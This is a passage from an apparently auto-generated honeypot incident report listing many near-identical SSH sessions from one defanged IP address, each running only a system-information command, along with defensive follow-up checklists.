| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:51:14` | `cowrie.session.connect` |
| `2026-07-30 16:51:14` | `cowrie.client.version` |
| `2026-07-30 16:51:14` | `cowrie.client.kex` |
| `2026-07-30 16:51:15` | `cowrie.login.success` |
| `2026-07-30 16:51:17` | `cowrie.session.params` |
| `2026-07-30 16:51:17` | `cowrie.command.input` |
| `2026-07-30 16:51:17` | `cowrie.log.closed` |
| `2026-07-30 16:51:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e73afbb8e0f3

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:51 |
| **Last Seen** | 2026-07-30 16:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:51:20` | `cowrie.session.connect` |
| `2026-07-30 16:51:20` | `cowrie.client.version` |
| `2026-07-30 16:51:20` | `cowrie.client.kex` |
| `2026-07-30 16:51:21` | `cowrie.login.success` |
| `2026-07-30 16:51:21` | `cowrie.session.params` |
| `2026-07-30 16:51:21` | `cowrie.command.input` |
| `2026-07-30 16:51:22` | `cowrie.log.closed` |
| `2026-07-30 16:51:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b52d66a18a89

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:51 |
| **Last Seen** | 2026-07-30 16:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:51:26` | `cowrie.session.connect` |
| `2026-07-30 16:51:26` | `cowrie.client.version` |
| `2026-07-30 16:51:26` | `cowrie.client.kex` |
| `2026-07-30 16:51:27` | `cowrie.login.success` |
| `2026-07-30 16:51:28` | `cowrie.session.params` |
| `2026-07-30 16:51:28` | `cowrie.command.input` |
| `2026-07-30 16:51:28` | `cowrie.log.closed` |
| `2026-07-30 16:51:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c9e7c7d8a316

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:51 |
| **Last Seen** | 2026-07-30 16:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:51:32` | `cowrie.session.connect` |
| `2026-07-30 16:51:32` | `cowrie.client.version` |
| `2026-07-30 16:51:33` | `cowrie.client.kex` |
| `2026-07-30 16:51:33` | `cowrie.login.success` |
| `2026-07-30 16:51:34` | `cowrie.session.params` |
| `2026-07-30 16:51:34` | `cowrie.command.input` |
| `2026-07-30 16:51:34` | `cowrie.log.closed` |
| `2026-07-30 16:51:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-39bb6088a814

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:51 |
| **Last Seen** | 2026-07-30 16:51 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:51:38` | `cowrie.session.connect` |
| `2026-07-30 16:51:38` | `cowrie.client.version` |
| `2026-07-30 16:51:38` | `cowrie.client.kex` |
| `2026-07-30 16:51:39` | `cowrie.login.success` |
| `2026-07-30 16:51:40` | `cowrie.session.params` |
| `2026-07-30 16:51:40` | `cowrie.command.input` |
| `2026-07-30 16:51:40` | `cowrie.log.closed` |
| `2026-07-30 16:51:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fda198fb092c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:51 |
| **Last Seen** | 2026-07-30 16:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:51:44` | `cowrie.session.connect` |
| `2026-07-30 16:51:44` | `cowrie.client.version` |
| `2026-07-30 16:51:44` | `cowrie.client.kex` |
| `2026-07-30 16:51:45` | `cowrie.login.success` |
| `2026-07-30 16:51:45` | `cowrie.session.params` |
| `2026-07-30 16:51:45` | `cowrie.command.input` |
| `2026-07-30 16:51:46` | `cowrie.log.closed` |
| `2026-07-30 16:51:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-960a3f819f2b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:51 |
| **Last Seen** | 2026-07-30 16:51 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:51:50` | `cowrie.session.connect` |
| `2026-07-30 16:51:50` | `cowrie.client.version` |
| `2026-07-30 16:51:50` | `cowrie.client.kex` |
| `2026-07-30 16:51:51` | `cowrie.login.success` |
| `2026-07-30 16:51:51` | `cowrie.session.params` |
| `2026-07-30 16:51:51` | `cowrie.command.input` |
| `2026-07-30 16:51:52` | `cowrie.log.closed` |
| `2026-07-30 16:51:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4677aca0f78a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:51 |
| **Last Seen** | 2026-07-30 16:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:51:56` | `cowrie.session.connect` |
| `2026-07-30 16:51:56` | `cowrie.client.version` |
| `2026-07-30 16:51:56` | `cowrie.client.kex` |
| `2026-07-30 16:51:57` | `cowrie.login.success` |
| `2026-07-30 16:51:57` | `cowrie.session.params` |
| `2026-07-30 16:51:57` | `cowrie.command.input` |
| `2026-07-30 16:51:57` | `cowrie.log.closed` |
| `2026-07-30 16:51:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-02a462a419bc

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:52 |
| **Last Seen** | 2026-07-30 16:52 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:52:02` | `cowrie.session.connect` |
| `2026-07-30 16:52:02` | `cowrie.client.version` |
| `2026-07-30 16:52:02` | `cowrie.client.kex` |
| `2026-07-30 16:52:02` | `cowrie.login.success` |
| `2026-07-30 16:52:03` | `cowrie.session.params` |
| `2026-07-30 16:52:03` | `cowrie.command.input` |
| `2026-07-30 16:52:04` | `cowrie.log.closed` |
| `2026-07-30 16:52:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1e40caa46697

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:52 |
| **Last Seen** | 2026-07-30 16:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:52:07` | `cowrie.session.connect` |
| `2026-07-30 16:52:07` | `cowrie.client.version` |
| `2026-07-30 16:52:07` | `cowrie.client.kex` |
| `2026-07-30 16:52:08` | `cowrie.login.success` |
| `2026-07-30 16:52:09` | `cowrie.session.params` |
| `2026-07-30 16:52:09` | `cowrie.command.input` |
| `2026-07-30 16:52:09` | `cowrie.log.closed` |
| `2026-07-30 16:52:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c77bccaa760

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:52 |
| **Last Seen** | 2026-07-30 16:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:52:14` | `cowrie.session.connect` |
| `2026-07-30 16:52:14` | `cowrie.client.version` |
| `2026-07-30 16:52:14` | `cowrie.client.kex` |
| `2026-07-30 16:52:14` | `cowrie.login.success` |
| `2026-07-30 16:52:15` | `cowrie.session.params` |
| `2026-07-30 16:52:15` | `cowrie.command.input` |
| `2026-07-30 16:52:16` | `cowrie.log.closed` |
| `2026-07-30 16:52:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-78e2771f5dc3

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:52 |
| **Last Seen** | 2026-07-30 16:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:52:20` | `cowrie.session.connect` |
| `2026-07-30 16:52:20` | `cowrie.client.version` |
| `2026-07-30 16:52:20` | `cowrie.client.kex` |
| `2026-07-30 16:52:20` | `cowrie.login.success` |
| `2026-07-30 16:52:21` | `cowrie.session.params` |
| `2026-07-30 16:52:21` | `cowrie.command.input` |
| `2026-07-30 16:52:21` | `cowrie.log.closed` |
| `2026-07-30 16:52:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dfaa9cd8ed02

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:52 |
| **Last Seen** | 2026-07-30 16:52 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:52:26` | `cowrie.session.connect` |
| `2026-07-30 16:52:26` | `cowrie.client.version` |
| `2026-07-30 16:52:26` | `cowrie.client.kex` |
| `2026-07-30 16:52:27` | `cowrie.login.success` |
| `2026-07-30 16:52:28` | `cowrie.session.params` |
| `2026-07-30 16:52:28` | `cowrie.command.input` |
| `2026-07-30 16:52:28` | `cowrie.log.closed` |
| `2026-07-30 16:52:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ffa4b451c600

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:52 |
| **Last Seen** | 2026-07-30 16:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:52:33` | `cowrie.session.connect` |
| `2026-07-30 16:52:33` | `cowrie.client.version` |
| `2026-07-30 16:52:33` | `cowrie.client.kex` |
| `2026-07-30 16:52:33` | `cowrie.login.success` |
| `2026-07-30 16:52:34` | `cowrie.session.params` |
| `2026-07-30 16:52:34` | `cowrie.command.input` |
| `2026-07-30 16:52:34` | `cowrie.log.closed` |
| `2026-07-30 16:52:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-146921921b50

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:52 |
| **Last Seen** | 2026-07-30 16:52 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:52:38` | `cowrie.session.connect` |
| `2026-07-30 16:52:39` | `cowrie.client.version` |
| `2026-07-30 16:52:39` | `cowrie.client.kex` |
| `2026-07-30 16:52:39` | `cowrie.login.success` |
| `2026-07-30 16:52:40` | `cowrie.session.params` |
| `2026-07-30 16:52:40` | `cowrie.command.input` |
| `2026-07-30 16:52:40` | `cowrie.log.closed` |
| `2026-07-30 16:52:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-431bd60cb81c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:52 |
| **Last Seen** | 2026-07-30 16:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:52:44` | `cowrie.session.connect` |
| `2026-07-30 16:52:45` | `cowrie.client.version` |
| `2026-07-30 16:52:45` | `cowrie.client.kex` |
| `2026-07-30 16:52:45` | `cowrie.login.success` |
| `2026-07-30 16:52:46` | `cowrie.session.params` |
| `2026-07-30 16:52:46` | `cowrie.command.input` |
| `2026-07-30 16:52:46` | `cowrie.log.closed` |
| `2026-07-30 16:52:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-99a63917c4fe

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:52 |
| **Last Seen** | 2026-07-30 16:52 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:52:50` | `cowrie.session.connect` |
| `2026-07-30 16:52:50` | `cowrie.client.version` |
| `2026-07-30 16:52:50` | `cowrie.client.kex` |
| `2026-07-30 16:52:51` | `cowrie.login.success` |
| `2026-07-30 16:52:52` | `cowrie.session.params` |
| `2026-07-30 16:52:52` | `cowrie.command.input` |
| `2026-07-30 16:52:53` | `cowrie.log.closed` |
| `2026-07-30 16:52:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-40a58e0763f3

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:52 |
| **Last Seen** | 2026-07-30 16:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:52:56` | `cowrie.session.connect` |
| `2026-07-30 16:52:56` | `cowrie.client.version` |
| `2026-07-30 16:52:56` | `cowrie.client.kex` |
| `2026-07-30 16:52:57` | `cowrie.login.success` |
| `2026-07-30 16:52:58` | `cowrie.session.params` |
| `2026-07-30 16:52:58` | `cowrie.command.input` |
| `2026-07-30 16:52:58` | `cowrie.log.closed` |
| `2026-07-30 16:52:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4bcf8b32eaa6

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:53 |
| **Last Seen** | 2026-07-30 16:53 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:53:02` | `cowrie.session.connect` |
| `2026-07-30 16:53:02` | `cowrie.client.version` |
| `2026-07-30 16:53:02` | `cowrie.client.kex` |
| `2026-07-30 16:53:03` | `cowrie.login.success` |
| `2026-07-30 16:53:04` | `cowrie.session.params` |
| `2026-07-30 16:53:04` | `cowrie.command.input` |
| `2026-07-30 16:53:05` | `cowrie.log.closed` |
| `2026-07-30 16:53:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-84e10c396fa4

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:53 |
| **Last Seen** | 2026-07-30 16:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:53:08` | `cowrie.session.connect` |
| `2026-07-30 16:53:08` | `cowrie.client.version` |
| `2026-07-30 16:53:08` | `cowrie.client.kex` |
| `2026-07-30 16:53:09` | `cowrie.login.success` |
| `2026-07-30 16:53:09` | `cowrie.session.params` |
| `2026-07-30 16:53:09` | `cowrie.command.input` |
| `2026-07-30 16:53:10` | `cowrie.log.closed` |
| `2026-07-30 16:53:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f1f690df3b45

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:53 |
| **Last Seen** | 2026-07-30 16:53 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:53:13` | `cowrie.session.connect` |
| `2026-07-30 16:53:14` | `cowrie.client.version` |
| `2026-07-30 16:53:14` | `cowrie.client.kex` |
| `2026-07-30 16:53:15` | `cowrie.login.success` |
| `2026-07-30 16:53:16` | `cowrie.session.params` |
| `2026-07-30 16:53:16` | `cowrie.command.input` |
| `2026-07-30 16:53:16` | `cowrie.log.closed` |
| `2026-07-30 16:53:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f37b089a88f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:53 |
| **Last Seen** | 2026-07-30 16:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:53:20` | `cowrie.session.connect` |
| `2026-07-30 16:53:20` | `cowrie.client.version` |
| `2026-07-30 16:53:20` | `cowrie.client.kex` |
| `2026-07-30 16:53:20` | `cowrie.login.success` |
| `2026-07-30 16:53:21` | `cowrie.session.params` |
| `2026-07-30 16:53:21` | `cowrie.command.input` |
| `2026-07-30 16:53:22` | `cowrie.log.closed` |
| `2026-07-30 16:53:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1cb5f635f5cb

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:53 |
| **Last Seen** | 2026-07-30 16:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:53:26` | `cowrie.session.connect` |
| `2026-07-30 16:53:26` | `cowrie.client.version` |
| `2026-07-30 16:53:26` | `cowrie.client.kex` |
| `2026-07-30 16:53:27` | `cowrie.login.success` |
| `2026-07-30 16:53:28` | `cowrie.session.params` |
| `2026-07-30 16:53:28` | `cowrie.command.input` |
| `2026-07-30 16:53:28` | `cowrie.log.closed` |
| `2026-07-30 16:53:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6713cef7c3ea

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:53 |
| **Last Seen** | 2026-07-30 16:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:53:32` | `cowrie.session.connect` |
| `2026-07-30 16:53:32` | `cowrie.client.version` |
| `2026-07-30 16:53:32` | `cowrie.client.kex` |
| `2026-07-30 16:53:33` | `cowrie.login.success` |
| `2026-07-30 16:53:33` | `cowrie.session.params` |
| `2026-07-30 16:53:33` | `cowrie.command.input` |
| `2026-07-30 16:53:33` | `cowrie.log.closed` |
| `2026-07-30 16:53:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-986ba5091271

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:53 |
| **Last Seen** | 2026-07-30 16:53 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:53:38` | `cowrie.session.connect` |
| `2026-07-30 16:53:38` | `cowrie.client.version` |
| `2026-07-30 16:53:38` | `cowrie.client.kex` |
| `2026-07-30 16:53:39` | `cowrie.login.success` |
| `2026-07-30 16:53:40` | `cowrie.session.params` |
| `2026-07-30 16:53:40` | `cowrie.command.input` |
| `2026-07-30 16:53:40` | `cowrie.log.closed` |
| `2026-07-30 16:53:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-212767ad858e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:53 |
| **Last Seen** | 2026-07-30 16:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:53:44` | `cowrie.session.connect` |
| `2026-07-30 16:53:44` | `cowrie.client.version` |
| `2026-07-30 16:53:44` | `cowrie.client.kex` |
| `2026-07-30 16:53:45` | `cowrie.login.success` |
| `2026-07-30 16:53:46` | `cowrie.session.params` |
| `2026-07-30 16:53:46` | `cowrie.command.input` |
| `2026-07-30 16:53:46` | `cowrie.log.closed` |
| `2026-07-30 16:53:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1038a5695c57

